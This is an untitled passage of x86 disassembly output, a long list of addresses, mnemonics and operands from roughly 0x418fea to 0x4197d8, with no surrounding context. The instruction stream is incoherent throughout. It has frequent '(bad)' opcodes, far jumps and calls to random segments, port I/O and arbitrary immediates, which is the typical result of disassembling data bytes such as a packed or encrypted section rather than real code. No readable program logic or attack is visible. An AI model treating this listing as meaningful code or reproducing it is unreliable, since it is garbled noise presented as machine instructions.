  418fea:	pop    ebx
  418feb:	cmp    DWORD PTR [ebx+eax*1],eax
  418fee:	inc    eax
  418fef:	ds mov dl,0xec
  418ff2:	add    ah,ah
  418ff4:	repnz imul esp,DWORD PTR [eax+0x69],0x57c89a96
  418ffc:	mov    ecx,0x31792a17
  419001:	push   ds
  419002:	push   esi
  419003:	ja     0x418fd9
  419005:	out    dx,al
  419006:	dec    DWORD PTR [eax+edi*2+0x32]
  41900a:	mov    bh,0x57
  41900c:	mov    bh,0x64
  41900e:	push   ds
  41900f:	sub    DWORD PTR [esi],edx
  419011:	xor    al,0x95
  419013:	add    bh,al
  419015:	or     ch,BYTE PTR [edi+0x4d25fb52]
  41901b:	int3   
  41901c:	repz fbstp TBYTE PTR [eax]
  41901f:	mov    al,BYTE PTR [ebx]
  419021:	pusha  
  419022:	inc    edi
  419023:	lods   eax,DWORD PTR ds:[esi]
  419024:	mov    ch,0xfd
  419026:	adc    al,0xe5
  419028:	(bad)
  41902b:	inc    esp
  41902c:	stc    
  41902d:	je     0x418fcf
  41902f:	pushf  
  419030:	push   edx
  419031:	rol    BYTE PTR [edx-0x5da3e783],1
  419037:	and    ch,BYTE PTR [eax+ebp*2]
  41903a:	cld    
  41903b:	shl    BYTE PTR [eax-0x579fa779],1
  419041:	dec    ecx
  419042:	dec    eax
  419043:	arpl   WORD PTR [ebx+0x76e43bcb],si
  419049:	mov    ebp,0x937c1dd6
  41904e:	es (bad) 
  419051:	add    DWORD PTR [ebx-0x287d987d],edx
  419057:	inc    eax
  419058:	jae    0x41903c
  41905a:	stc    
  41905b:	mov    al,0x95
  41905d:	fist   DWORD PTR [eax]
  41905f:	lods   al,BYTE PTR ds:[esi]
  419060:	jle    0x419064
  419062:	jle    0x419048
  419064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419065:	fwait
  419066:	mov    ebp,0xe7dcf5b9
  41906b:	fldcw  WORD PTR [ebp-0x2e]
  41906e:	loopne 0x41905d
  419070:	xchg   edx,eax
  419071:	or     BYTE PTR ds:0x5024ab86,cl
  419077:	fcomi  st,st(3)
  419079:	mov    dh,0x69
  41907b:	(bad)
  419080:	mov    ecx,0x658d8102
  419085:	cmp    eax,0x83139b04
  41908a:	inc    ebx
  41908b:	ss xchg edx,eax
  41908d:	mov    bh,0x43
  41908f:	stos   BYTE PTR es:[edi],al
  419090:	in     eax,dx
  419091:	xchg   BYTE PTR [edx],al
  419093:	push   esi
  419094:	mov    ebx,edx
  419096:	fldcw  WORD PTR [esi+0x67ea25ce]
  41909c:	ret    
  41909d:	adc    edi,0xffffffc2
  4190a0:	pcmpeqb mm2,QWORD PTR [esi+0x126840c8]
  4190a7:	sti    
  4190a8:	cmp    ebp,ecx
  4190aa:	lea    ebp,[edx+eiz*2+0xe8bca84]
  4190b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190b2:	dec    esp
  4190b3:	in     eax,0xc9
  4190b5:	enter  0x7d92,0x3b
  4190b9:	jg     0x41912d
  4190bb:	enter  0xc5b,0x95
  4190bf:	ins    BYTE PTR es:[edi],dx
  4190c0:	les    eax,FWORD PTR [edx]
  4190c2:	adc    eax,edi
  4190c4:	daa    
  4190c5:	das    
  4190c6:	jae    0x41906e
  4190c8:	or     DWORD PTR [eax-0x69],esp
  4190cb:	mov    al,ds:0x1afbb56a
  4190d0:	mov    dh,0x60
  4190d2:	test   eax,0x92b75b55
  4190d7:	xchg   esp,eax
  4190d8:	push   cs
  4190d9:	outs   dx,DWORD PTR ds:[esi]
  4190da:	mov    ah,0xc1
  4190dc:	and    ebx,DWORD PTR [eax+eiz*1+0x27]
  4190e0:	in     eax,dx
  4190e1:	push   esp
  4190e2:	mov    al,ds:0xba3aa52b
  4190e7:	xlat   BYTE PTR ds:[ebx]
  4190e8:	imul   edx,DWORD PTR [edx],0x4037f5d3
  4190ee:	mov    edx,0xd94912a5
  4190f3:	dec    esp
  4190f4:	scas   eax,DWORD PTR es:[edi]
  4190f5:	xor    eax,0x4b2603ab
  4190fa:	pusha  
  4190fb:	jnp    0x41912c
  4190fd:	add    ch,bh
  4190ff:	(bad)  
  419100:	pop    ebx
  419101:	sar    DWORD PTR [edi+0x1f82dab1],0x6
  419108:	pop    eax
  419109:	fstp   QWORD PTR [edx]
  41910b:	push   ecx
  41910c:	jecxz  0x41914d
  41910e:	stc    
  41910f:	dec    ebp
  419110:	mov    eax,gs
  419112:	call   0x18cb:0xa9d53d0b
  419119:	(bad)  
  41911a:	jle    0x4190a2
  41911c:	fadd   st(1),st
  41911e:	add    al,0x67
  419120:	sti    
  419121:	outs   dx,BYTE PTR ds:[esi]
  419122:	or     al,0x7
  419124:	das    
  419125:	adc    DWORD PTR [esi+0x7d5de0ce],ebp
  41912b:	div    BYTE PTR [edi]
  41912d:	mov    BYTE PTR [esi],cl
  41912f:	rcr    BYTE PTR [esi+0x18],0xc5
  419133:	jnp    0x419197
  419135:	xchg   ebx,eax
  419136:	aad    0x38
  419138:	push   eax
  419139:	test   BYTE PTR [edx],al
  41913b:	jae    0x419147
  41913d:	out    dx,al
  41913e:	sahf   
  41913f:	fs (bad) 
  419141:	in     eax,dx
  419142:	or     al,0xba
  419144:	sbb    al,ah
  419146:	pop    DWORD PTR [edi]
  419148:	sbb    esp,DWORD PTR [ebx+0x5031da54]
  41914e:	mov    ah,0x9f
  419150:	inc    ebp
  419151:	add    DWORD PTR [esi+0x99f095e],0xffffffaf
  419158:	inc    edx
  419159:	enter  0xe471,0x4a
  41915d:	push   ds
  41915e:	jb     0x4191a6
  419160:	or     al,0x1f
  419162:	jmp    0xac9a:0xc2d6614
  419169:	inc    eax
  41916b:	or     BYTE PTR [ecx],ch
  41916d:	adc    eax,0xb5222e86
  419172:	sub    dl,al
  419174:	add    edi,DWORD PTR [esi+0x14098ca1]
  41917a:	bsr    esi,DWORD PTR [eax+0x14ea87c3]
  419181:	cmp    eax,0x4f15ffa8
  419186:	and    dl,BYTE PTR [ecx]
  419188:	or     eax,DWORD PTR [ebx-0xd]
  41918b:	or     BYTE PTR [esi],cl
  41918d:	push   es
  41918e:	sbb    si,dx
  419191:	dec    ebp
  419192:	sti    
  419193:	test   BYTE PTR [ecx-0x53962161],ch
  419199:	outs   dx,BYTE PTR ds:[esi]
  41919a:	add    BYTE PTR [ebx+0x5e73ac5e],cl
  4191a0:	ins    DWORD PTR es:[edi],dx
  4191a1:	xor    esp,DWORD PTR [ecx]
  4191a3:	mov    edx,0xa3d33625
  4191a8:	sar    DWORD PTR [eax],cl
  4191aa:	fist   WORD PTR [ebx+0x21a78b8d]
  4191b0:	or     BYTE PTR [ebx-0x6954f27f],al
  4191b6:	adc    bh,bh
  4191b8:	aas    
  4191b9:	push   edi
  4191ba:	sbb    cl,0x3c
  4191bd:	inc    BYTE PTR [ecx]
  4191bf:	cmp    DWORD PTR [esi+0x57aa0606],eax
  4191c5:	mov    cl,0x43
  4191c7:	lock outs dx,BYTE PTR ds:[esi]
  4191c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191ca:	mov    ds:0xd22b06d1,al
  4191cf:	stos   DWORD PTR es:[edi],eax
  4191d0:	jbe    0x419176
  4191d2:	retf   
  4191d3:	(bad)  
  4191d4:	popa   
  4191d5:	pop    ecx
  4191d6:	es jg  0x41922c
  4191d9:	(bad)  
  4191da:	mov    edx,0x7410c409
  4191df:	push   edx
  4191e0:	dec    DWORD PTR [eax-0x63aec05]
  4191e6:	fimul  DWORD PTR [edi-0x2dfacfe3]
  4191ec:	mov    bh,0x59
  4191ee:	add    DWORD PTR [bp+di],esp
  4191f1:	add    BYTE PTR [edx],dh
  4191f3:	mov    bh,0x32
  4191f5:	mov    al,ds:0x59afbd4e
  4191fa:	mov    edi,0xe7094250
  4191ff:	(bad)
  419203:	mov    edx,ebp
  419205:	xchg   esp,eax
  419206:	pop    ebx
  419207:	fist   WORD PTR [ecx]
  419209:	shl    edi,0xaa
  41920c:	outs   dx,BYTE PTR ds:[esi]
  41920d:	cld    
  41920e:	fisttp DWORD PTR [ebx-0x2b37178d]
  419214:	rcr    DWORD PTR [edx-0x14],1
  419217:	mov    esi,0x9bde8f07
  41921c:	(bad)  
  41921d:	or     al,al
  41921f:	xchg   esi,eax
  419220:	jbe    0x419223
  419222:	jmp    0xc6d8:0x56e07ab3
  419229:	loopne 0x41924c
  41922b:	pop    eax
  41922c:	add    al,0xa0
  41922e:	xchg   edi,eax
  41922f:	mov    eax,ds:0xc9c69460
  419234:	(bad)  
  419235:	(bad)  
  419236:	push   edi
  419237:	and    eax,0xcd654d26
  41923c:	push   esi
  41923d:	push   esi
  41923e:	test   eax,0x94f340e1
  419243:	xor    dl,BYTE PTR [esi]
  419245:	fdivr  QWORD PTR [ecx]
  419247:	call   0x30fa165
  41924c:	pusha  
  41924d:	dec    edx
  41924e:	pop    edx
  41924f:	add    DWORD PTR [edi-0x217278e2],ebp
  419255:	aad    0xe1
  419257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419258:	add    eax,0xdbbc106f
  41925d:	loope  0x419297
  41925f:	mov    WORD PTR [ebx-0x51],es
  419262:	mov    ebp,0xd9a2222f
  419267:	inc    edx
  419268:	(bad)  
  419269:	jp     0x419281
  41926b:	inc    eax
  41926c:	jbe    0x4191f9
  41926e:	(bad)  
  41926f:	dec    esp
  419270:	js     0x419261
  419272:	das    
  419273:	test   eax,0x1b68bc0d
  419278:	retf   
  419279:	sbb    BYTE PTR [ebx+edx*1+0x357a2445],ah
  419280:	mov    al,0xe6
  419282:	sub    BYTE PTR [ecx+edx*1-0x1803af80],cl
  419289:	xor    eax,0xa33febf4
  41928e:	xchg   BYTE PTR [ecx-0x3f3441da],cl
  419294:	aad    0x22
  419296:	ficom  WORD PTR ds:0xd00660fb
  41929c:	daa    
  41929d:	dec    ebx
  41929e:	mov    esi,DWORD PTR [edx]
  4192a0:	(bad)  
  4192a1:	mov    edx,0x7b55b0e4
  4192a6:	loop   0x419254
  4192a8:	xor    ebx,DWORD PTR [edx-0x232be967]
  4192ae:	ins    DWORD PTR es:[edi],dx
  4192af:	and    eax,0xad8e9deb
  4192b4:	repz shr bl,cl
  4192b7:	jecxz  0x4192a3
  4192b9:	int    0x6
  4192bb:	inc    esi
  4192bc:	out    dx,al
  4192bd:	xchg   ebp,eax
  4192be:	jle    0x41933e
  4192c0:	(bad)  
  4192c2:	mov    bl,0xf
  4192c4:	sub    DWORD PTR [bp+0x7b9a],edx
  4192c9:	mov    DWORD PTR [edi-0x4],esp
  4192cc:	imul   esi,DWORD PTR [ecx-0x1c411919],0x2d
  4192d3:	cmp    ebp,eax
  4192d5:	lds    esp,FWORD PTR [esi]
  4192d7:	cmc    
  4192d8:	jg     0x4192ed
  4192da:	neg    BYTE PTR [eax-0x1d03dfa2]
  4192e0:	pop    edx
  4192e1:	leave  
  4192e2:	lahf   
  4192e3:	rol    esp,1
  4192e5:	sahf   
  4192e6:	mov    gs,WORD PTR [edx+eiz*4]
  4192e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192ea:	(bad)  
  4192eb:	adc    al,0xf7
  4192ed:	das    
  4192ee:	popf   
  4192ef:	ficom  DWORD PTR [esi]
  4192f1:	mov    WORD PTR [esi-0x732ef0f8],?
  4192f7:	(bad)  
  4192f8:	(bad)  
  4192f9:	outs   dx,BYTE PTR ds:[esi]
  4192fa:	mov    DWORD PTR [eax+0x194c2354],ecx
  419300:	es dec edi
  419302:	ins    BYTE PTR es:[edi],dx
  419303:	adc    eax,0xbffc090a
  419308:	mov    dh,0x6a
  41930a:	mov    ebp,0x6fcbaaf8
  41930f:	inc    ebx
  419310:	push   ss
  419311:	inc    ecx
  419312:	push   0xffffffda
  419314:	sub    esp,edi
  419316:	loopne 0x419382
  419318:	ret    0xe7d
  41931b:	xlat   BYTE PTR ds:[ebx]
  41931c:	je     0x419343
  41931e:	xchg   esi,eax
  41931f:	push   edx
  419320:	xor    ch,BYTE PTR [ebx-0x2cd105c2]
  419326:	popa   
  419327:	rcl    BYTE PTR [ebp+0x4f8595a0],cl
  41932d:	lea    ebx,[eax-0x1b937f10]
  419333:	mov    edx,esp
  419335:	push   ss
  419336:	lock adc BYTE PTR [ecx],ah
  419339:	mov    cl,BYTE PTR [edx+0x43]
  41933c:	xor    BYTE PTR [esi+0x1b937177],dh
  419342:	cld    
  419343:	arpl   WORD PTR [eax+0x6f],ax
  419346:	popa   
  419347:	repz dec esi
  419349:	ins    DWORD PTR es:[edi],dx
  41934a:	cmp    DWORD PTR [ebp+0x29ab92b9],0xffb1222d
  419354:	push   cs
  419355:	outs   dx,BYTE PTR ds:[esi]
  419356:	loopne 0x419346
  419358:	std    
  419359:	inc    edx
  41935a:	mov    ds:0xdb8d77c6,eax
  41935f:	and    eax,0xe4c05d83
  419364:	(bad)  
  419365:	xchg   edx,eax
  419366:	rol    BYTE PTR [ebx-0x9cb3b6d],1
  41936c:	and    eax,DWORD PTR [ebx-0x62bb5e46]
  419372:	enter  0x70ad,0xdf
  419376:	jmp    0x6c03cec9
  41937b:	and    bh,BYTE PTR [edx-0x2d358581]
  419381:	mov    al,ds:0xfbb216b5
  419386:	scas   eax,DWORD PTR es:[edi]
  419387:	ss dec ebp
  419389:	(bad)  
  41938b:	jecxz  0x4193f9
  41938d:	or     esi,DWORD PTR [ebp-0x4a]
  419390:	aam    0x6c
  419392:	dec    edi
  419393:	je     0x41934d
  419395:	addr16 dec esi
  419397:	or     DWORD PTR [ebx-0x76f0040d],edx
  41939d:	inc    edx
  41939e:	data16 in al,dx
  4193a0:	or     BYTE PTR [eax],0x8d
  4193a3:	lock mov edi,DWORD PTR [esi+0x35]
  4193a7:	pop    DWORD PTR [ebx+0x916fda3]
  4193ad:	mov    al,BYTE PTR [esi]
  4193af:	iret   
  4193b0:	dec    ecx
  4193b1:	mov    bl,bl
  4193b3:	adc    dl,cl
  4193b5:	jb     0x419366
  4193b7:	push   ecx
  4193b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193b9:	mov    ch,0x5c
  4193bb:	(bad)  
  4193bc:	out    dx,al
  4193bd:	inc    ebp
  4193be:	aad    0x60
  4193c0:	and    eax,0x3789870b
  4193c5:	and    ebp,DWORD PTR [ebp+0x27]
  4193c8:	mov    edi,0x50a7381f
  4193cd:	or     BYTE PTR [ebx+edi*1+0x12],ah
  4193d1:	repz sbb al,0xba
  4193d4:	pop    esp
  4193d5:	sbb    BYTE PTR [eax+eax*2],0xf8
  4193d9:	not    esi
  4193db:	je     0x419377
  4193dd:	clc    
  4193de:	fidivr DWORD PTR [edi-0x6b5bc426]
  4193e4:	mov    ah,0x30
  4193e6:	pop    edx
  4193e7:	adc    DWORD PTR [eax+0x2fe31a1d],ebx
  4193ed:	mov    al,0x70
  4193ef:	ret    0x697c
  4193f2:	or     al,0x7b
  4193f4:	adc    BYTE PTR [ebp-0x31e910a2],cl
  4193fa:	and    edi,esp
  4193fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193fd:	xchg   esi,eax
  4193fe:	adc    al,0xc0
  419400:	adc    BYTE PTR [esi+ebx*8-0x5],0x63
  419405:	pop    esi
  419406:	jmp    0x20d0958e
  41940b:	add    DWORD PTR [ebp-0x41],edx
  41940e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41940f:	push   edx
  419410:	lods   al,BYTE PTR ds:[esi]
  419411:	rcr    DWORD PTR [ebp+0x34],0x6c
  419415:	xchg   ecx,eax
  419416:	dec    esi
  419417:	inc    esi
  419418:	fucomp st(2)
  41941a:	leave  
  41941b:	jle    0x419465
  41941d:	mov    edx,0xd9005432
  419422:	pop    ecx
  419423:	mov    bl,0xbb
  419425:	ror    dh,1
  419427:	adc    bl,BYTE PTR [eax-0x60]
  41942a:	sti    
  41942b:	fdivrp st(4),st
  41942d:	bound  ebp,QWORD PTR [eax]
  41942f:	outs   dx,DWORD PTR ds:[esi]
  419430:	inc    ecx
  419431:	xlat   BYTE PTR ds:[ebx]
  419432:	std    
  419433:	sbb    al,0xc4
  419435:	xchg   edi,eax
  419436:	add    al,0xce
  419438:	jmp    0x67fb:0x9b213c0
  41943f:	jae    0x419489
  419441:	jnp    0x41946b
  419443:	fcmovu st,st(7)
  419445:	arpl   WORD PTR [edi+0x7d5cac2a],cx
  41944b:	addr16 dec ebx
  41944d:	cli    
  41944e:	or     al,0xe0
  419450:	mov    ebp,DWORD PTR [esp+eiz*4]
  419453:	cmp    edx,ebx
  419455:	add    ah,BYTE PTR [ebx+0x7e]
  419458:	shl    ebx,0xee
  41945b:	adc    ebx,DWORD PTR [edx+0xd]
  41945e:	fisttp WORD PTR [eax]
  419460:	or     esp,esi
  419462:	mov    esi,DWORD PTR [edi+0x0]
  419465:	push   edx
  419466:	(bad)  
  419467:	and    ah,BYTE PTR [edx+edi*4]
  41946a:	hlt    
  41946b:	jl     0x4194e3
  41946d:	mov    ecx,0x59a95967
  419472:	fmulp  st(2),st
  419474:	mov    edi,0xede70bdd
  419479:	mov    ah,0xfb
  41947b:	ds repnz push ebp
  41947e:	fst    DWORD PTR [edi-0x39]
  419481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419482:	data16 je 0x41945f
  419485:	adc    dl,BYTE PTR [edx-0xd20d329]
  41948b:	jle    0x419509
  41948d:	addr16 lahf 
  41948f:	xor    eax,0x4d2f1cf5
  419494:	fs out 0x9c,al
  419497:	pop    ebx
  419498:	dec    edx
  419499:	mov    al,ds:0x70599575
  41949e:	test   DWORD PTR [edi+0x34eb8120],edi
  4194a4:	call   0xdf0f:0x718bc558
  4194ab:	ins    DWORD PTR es:[edi],dx
  4194ac:	gs jbe 0x4194da
  4194af:	add    BYTE PTR [edi-0x5b084d54],dh
  4194b5:	jb     0x4194ae
  4194b7:	in     al,0xc4
  4194b9:	add    edx,DWORD PTR [esi-0x1d]
  4194bc:	mov    edi,0x268b8118
  4194c1:	cmp    BYTE PTR [eax+ebx*2-0x64383141],ah
  4194c8:	jnp    0x419532
  4194ca:	jnp    0x419488
  4194cc:	popa   
  4194cd:	inc    esi
  4194ce:	pop    ebp
  4194cf:	cli    
  4194d0:	mov    eax,DWORD PTR ds:0x85d2dbff
  4194d6:	test   al,0xa7
  4194d8:	mov    ebp,0xf5470d49
  4194dd:	rcl    BYTE PTR [esp+edi*2],1
  4194e0:	stos   BYTE PTR es:[edi],al
  4194e1:	out    dx,eax
  4194e2:	push   0xffffffdd
  4194e4:	jmp    0xf80:0xdc95998a
  4194eb:	jle    0x41951e
  4194ed:	fs inc edx
  4194ef:	stos   DWORD PTR es:[edi],eax
  4194f0:	push   ebx
  4194f1:	cmp    al,0x6b
  4194f3:	or     BYTE PTR [edx],ch
  4194f5:	pop    es
  4194f6:	lods   al,BYTE PTR ds:[esi]
  4194f7:	call   0xc4c51e27
  4194fc:	xchg   ebp,eax
  4194fd:	dec    esp
  4194fe:	xchg   ecx,eax
  4194ff:	or     eax,0xee5508f3
  419504:	stos   DWORD PTR es:[edi],eax
  419505:	push   ebp
  419506:	jge    0x41951d
  419508:	std    
  419509:	mov    ebp,ss
  41950b:	add    al,ch
  41950d:	sbb    al,ah
  41950f:	push   ebp
  419510:	xchg   BYTE PTR [esi-0x16],bh
  419513:	clc    
  419514:	mov    ch,0x24
  419516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419517:	push   ebx
  419518:	mov    gs,WORD PTR [edx]
  41951a:	mov    ch,0x36
  41951c:	icebp  
  41951d:	mov    esi,0x4172bb9c
  419522:	dec    esp
  419523:	div    BYTE PTR [ebp+0x3b37cbc5]
  419529:	push   esp
  41952b:	pop    eax
  41952c:	inc    eax
  41952d:	push   ebp
  41952e:	pop    ds
  41952f:	lds    edi,FWORD PTR [esi-0x4b]
  419532:	push   esi
  419533:	lock xlat BYTE PTR ds:[ebx]
  419535:	in     eax,0xba
  419537:	data16 and BYTE PTR [ebx-0x32488548],al
  41953e:	jb     0x4194d0
  419540:	stos   DWORD PTR es:[edi],eax
  419541:	pop    ecx
  419542:	fisttp DWORD PTR [ebp+0x60fdb3e3]
  419548:	loope  0x419542
  41954a:	or     eax,0x709feb71
  41954f:	add    bl,BYTE PTR [eax+0x6f]
  419552:	retf   0xcc0e
  419555:	aaa    
  419556:	fmul   DWORD PTR ds:0xca11dc2e
  41955c:	in     eax,0x4f
  41955e:	pop    ebx
  41955f:	imul   ebx,DWORD PTR ss:[edx],0xd0891bf1
  419566:	xor    esi,eax
  419568:	pop    es
  419569:	outs   dx,DWORD PTR ds:[esi]
  41956a:	imul   esp,esp,0x1c
  41956d:	(bad)  
  41956e:	arpl   WORD PTR [eax-0x64],dx
  419571:	sbb    edi,DWORD PTR [ecx+0x4bc36f4c]
  419577:	and    ebp,DWORD PTR [edx]
  419579:	fiadd  WORD PTR [esi-0x80]
  41957c:	sub    eax,DWORD PTR [eax]
  41957e:	les    ebp,FWORD PTR ds:0xd1611380
  419584:	ins    DWORD PTR es:[edi],dx
  419585:	cmp    dl,BYTE PTR [edx-0x1a0d694]
  41958b:	sar    DWORD PTR [eax],0x1d
  41958e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41958f:	dec    esp
  419590:	xlat   BYTE PTR ds:[ebx]
  419591:	push   cs
  419592:	or     ecx,0xfffffffb
  419595:	das    
  419596:	gs inc ebx
  419598:	test   eax,0xc1913a68
  41959d:	mov    al,ds:0x5fccacac
  4195a2:	dec    ebp
  4195a3:	call   0x51f9:0x5d957c8c
  4195aa:	(bad)  
  4195ab:	lods   al,BYTE PTR ds:[esi]
  4195ac:	xor    cl,ch
  4195ae:	xchg   ecx,esi
  4195b0:	or     DWORD PTR [ebx-0x1cb86816],edi
  4195b6:	cmp    dl,dl
  4195b8:	fwait
  4195b9:	shl    DWORD PTR [ebx],cl
  4195bb:	xchg   ecx,eax
  4195bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195bd:	repnz push ecx
  4195bf:	xchg   ebx,eax
  4195c0:	nop
  4195c1:	es mov esi,0xc9c95d6a
  4195c7:	rol    DWORD PTR ds:0x1a3c1268,cl
  4195cd:	pop    ebp
  4195ce:	adc    DWORD PTR [esi-0x42],ebp
  4195d1:	and    dl,BYTE PTR [esp+edx*4-0x148c655f]
  4195d8:	std    
  4195d9:	dec    ebx
  4195da:	cmp    eax,0x1b412ba9
  4195df:	(bad)  
  4195e1:	jge    0x4195de
  4195e3:	push   ebp
  4195e4:	pop    eax
  4195e5:	add    al,0xfe
  4195e7:	cld    
  4195e8:	sbb    eax,0xe3566842
  4195ed:	xchg   ecx,eax
  4195ee:	popf   
  4195ef:	inc    edx
  4195f0:	ret    0x2a50
  4195f3:	xor    DWORD PTR [ebx-0x5b],esp
  4195f6:	jp     0x41966a
  4195f8:	cld    
  4195f9:	or     BYTE PTR [ebx],bh
  4195fb:	fdiv   st,st(6)
  4195fd:	add    eax,0x2c90f464
  419602:	mov    esi,0x696646c5
  419607:	jmp    0x4195bd
  419609:	mov    eax,0x6f902ab
  41960e:	and    al,0x41
  419610:	mov    BYTE PTR [ebx+edi*2-0x153b19fa],cl
  419617:	fsubr  DWORD PTR [eax]
  419619:	rcl    BYTE PTR [edi],1
  41961b:	dec    eax
  41961c:	in     al,0x30
  41961e:	js     0x4195a0
  419620:	ror    dh,0x79
  419623:	inc    esi
  419624:	jl     0x41968a
  419626:	cs mov al,0xe1
  419629:	test   BYTE PTR [ebx+0x26],dl
  41962c:	fldcw  WORD PTR [ecx+0x17bc1e6f]
  419632:	push   esp
  419633:	cwde   
  419634:	cmp    eax,0x3ef941fe
  419639:	adc    BYTE PTR [esi],al
  41963b:	ds jnp 0x4195e6
  41963e:	nop
  41963f:	mov    cl,BYTE PTR [ebp-0x20dd8af8]
  419645:	ja     0x4195cd
  419647:	outs   dx,BYTE PTR ds:[esi]
  419648:	mov    bl,BYTE PTR [ebp-0x19]
  41964b:	shl    DWORD PTR [ebp+ecx*4-0x39],cl
  41964f:	and    cl,dh
  419651:	and    eax,0x67db4362
  419656:	call   0x2e24:0x902214b6
  41965d:	in     al,0xdb
  41965f:	jne    0x41960d
  419661:	and    ecx,DWORD PTR [edi+eiz*1]
  419664:	jp     0x419659
  419666:	loopne 0x41969d
  419668:	xchg   esi,eax
  419669:	dec    eax
  41966a:	sbb    eax,0xc0ee0901
  41966f:	pop    ss
  419670:	add    BYTE PTR [ebx+0x52019e12],bh
  419676:	outs   dx,BYTE PTR ds:[esi]
  419677:	aam    0xb5
  419679:	aaa    
  41967a:	in     al,0xa8
  41967c:	test   eax,0x131dab7a
  419681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419682:	lahf   
  419683:	imul   ebp,DWORD PTR [ecx+0x34],0xb
  419687:	inc    ebp
  419688:	dec    ecx
  419689:	inc    esp
  41968a:	xor    eax,0x45601a47
  41968f:	push   ebx
  419690:	ret    
  419691:	sahf   
  419692:	adc    edi,DWORD PTR [ecx+0x21]
  419695:	loop   0x419704
  419697:	clc    
  419698:	cmp    dh,ah
  41969a:	add    al,0x25
  41969c:	das    
  41969d:	cwde   
  41969e:	iret   
  41969f:	cli    
  4196a0:	jp     0x4196dc
  4196a2:	xor    eax,0xabceb628
  4196a7:	fucomip st,st(7)
  4196a9:	jae    0x4196e5
  4196ab:	push   ecx
  4196ac:	dec    eax
  4196ad:	xor    al,0x7b
  4196af:	sbb    DWORD PTR [eax+eax*2+0x575e8211],0xffffffb8
  4196b7:	and    BYTE PTR [ebx],ch
  4196b9:	rcl    DWORD PTR [esi],1
  4196bb:	mov    edx,0x695214a5
  4196c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196c1:	adc    eax,0x422a0fce
  4196c6:	or     ebx,DWORD PTR ds:0xabe7079d
  4196cc:	aam    0x21
  4196ce:	cmp    ebx,DWORD PTR [ebp-0x79da66dd]
  4196d4:	jne    0x419658
  4196d6:	bound  ecx,QWORD PTR [edx]
  4196d8:	jbe    0x41967d
  4196da:	cld    
  4196db:	inc    edi
  4196dc:	sbb    al,0xcb
  4196de:	popa   
  4196df:	aad    0x17
  4196e1:	popa   
  4196e2:	je     0x419727
  4196e4:	mov    ecx,0xd3f9ebfb
  4196e9:	in     eax,dx
  4196ea:	pop    ebp
  4196eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196ec:	mov    ah,0x25
  4196ee:	or     esi,0x43ec8aa4
  4196f4:	jle    0x41972b
  4196f6:	mov    dl,0x43
  4196f8:	pop    esp
  4196f9:	sbb    al,0x4f
  4196fb:	mov    bl,0x6e
  4196fd:	mov    BYTE PTR [eax],ah
  4196ff:	cwde   
  419700:	cld    
  419701:	ret    
  419702:	leave  
  419703:	mov    bh,0xf6
  419705:	pop    ebp
  419706:	pop    ebp
  419707:	mov    WORD PTR [ecx],cs
  419709:	fs pop edx
  41970b:	repz sbb ebp,DWORD PTR [esi]
  41970e:	adc    eax,esi
  419710:	into   
  419711:	shrd   DWORD PTR [edi+0x51],edx,cl
  419715:	rcr    DWORD PTR [ebx+0x46d5c61],1
  41971b:	xchg   edi,eax
  41971c:	mov    ds:0x883548bb,al
  419721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419722:	adc    eax,0x7db34c10
  419727:	das    
  419728:	outs   dx,DWORD PTR ds:[esi]
  419729:	mov    cl,bh
  41972b:	retf   
  41972c:	xor    eax,0xd3340377
  419731:	cmp    DWORD PTR [ebp+eiz*1+0x76],esp
  419735:	fs icebp 
  419737:	fiadd  DWORD PTR [esi+edx*4+0x32f82940]
  41973e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41973f:	aaa    
  419740:	repnz mov esp,0x6984a848
  419746:	out    dx,eax
  419747:	mov    esi,0xd497ae8d
  41974c:	mov    dh,0x59
  41974e:	pop    sp
  419750:	imul   eax,DWORD PTR [esi+0x7a5703c3],0xc53d8338
  41975a:	pop    esp
  41975b:	aaa    
  41975c:	cmc    
  41975d:	push   ebp
  41975e:	aaa    
  41975f:	jae    0x4197b2
  419761:	mov    dh,0xaf
  419763:	pop    edi
  419764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419765:	jo     0x4197d7
  419767:	fs mov edi,0x515b5fb4
  41976d:	rol    BYTE PTR [ebx],0xb0
  419770:	pop    ds
  419771:	adc    DWORD PTR [eax+0x3d48b9dc],edi
  419777:	jns    0x4197ce
  419779:	ss mov bh,0xda
  41977c:	aas    
  41977d:	mov    ebx,ss
  41977f:	pop    eax
  419780:	and    BYTE PTR [esi-0x13],cl
  419783:	lea    ebx,[ebx+0x301416f3]
  419789:	dec    ebx
  41978a:	leave  
  41978b:	sub    BYTE PTR [eax],cl
  41978d:	hlt    
  41978e:	mov    esp,0xf1135aed
  419793:	adc    ecx,DWORD PTR [eax-0x196932fe]
  419799:	pop    esi
  41979a:	mov    ecx,0x3f886b0e
  41979f:	push   edi
  4197a0:	xchg   esp,eax
  4197a1:	call   0xe64f:0x6c6835de
  4197a8:	ss adc DWORD PTR ss:[ebp+0x54],esi
  4197ad:	dec    eax
  4197ae:	mov    ebx,0x335f8657
  4197b3:	ds retf 
  4197b5:	dec    esp
  4197b6:	call   ebp
  4197b8:	sahf   
  4197b9:	ret    0x232f
  4197bc:	push   0xadaeda2a
  4197c1:	and    eax,0x9ff6c2e3
  4197c6:	sbb    al,0x6f
  4197c8:	data16 cmp cl,BYTE PTR [ecx]
  4197cb:	push   edx
  4197cc:	mov    al,0xff
  4197ce:	pop    esi
  4197cf:	mov    bh,0xca
  4197d1:	pop    ss
  4197d2:	test   DWORD PTR [edx-0x5a08b47],esp
  4197d8:	pushf  
